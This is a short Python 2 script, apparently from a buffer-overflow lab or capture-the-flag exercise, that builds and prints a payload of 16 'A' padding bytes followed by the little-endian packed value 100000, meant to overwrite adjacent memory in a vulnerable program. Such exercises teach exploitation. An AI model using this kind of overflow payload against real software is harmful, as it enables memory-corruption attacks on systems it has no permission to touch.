#!/usr/bin/env python2

import struct
PAYLOAD = 'A' * 16 + struct.pack('<I', 100000)
print (PAYLOAD)
